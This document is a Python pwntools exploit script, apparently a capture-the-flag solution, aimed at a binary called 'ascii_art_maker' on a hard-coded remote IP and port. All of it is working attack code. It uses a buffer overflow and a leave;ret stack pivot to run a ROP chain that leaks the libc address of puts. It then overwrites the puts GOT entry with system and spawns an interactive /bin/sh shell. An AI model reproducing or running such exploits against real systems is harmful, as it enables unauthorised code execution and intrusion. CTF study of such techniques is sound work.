#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./ascii_art_maker"
ENV = {"LD_PRELOAD":"./libc64.so"}

system_off = 0x45390
puts_off = 0x6f690
one_gadget1 = 0xf02a4

puts_got = 0x602020
puts_plt = 0x400570
read_plt = 0x4005a0

pop_rdi_ret = 0x400a93
pop_rsi_pop_ret = 0x400a91
leave_ret = 0x400a2b

#p = process(elf)
p = remote("111.230.149.72", 10012)

p.recvuntil("input the string you want to convert:\n")

payload = p8(0)*0x80
payload += p64(0x602680)
payload += p64(0x4009fc)
p.send(payload)

#gdb.attach(p)
payload = p8(0)*0x8
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(0)
payload += p64(pop_rsi_pop_ret)
payload += p64(puts_got)+p64(0)
payload += p64(read_plt)
payload += p64(pop_rdi_ret)
payload += p64(0x602668)
payload += p64(puts_plt)
payload += "/bin/sh\x00"
payload += p8(0)*(0x80-len(payload))
payload += p64(0x602600)
payload += p64(leave_ret)
#payload += p64(0x4009fc)
p.send(payload)

payload = p8(0)*0x80
payload += p64(0x602580)
payload += p64(pop_rdi_ret)
#p.send(payload)

libc_base = u64(p.recv(6).ljust(8, "\x00"))-puts_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off

p.sendline(p64(system_addr))

p.interactive()
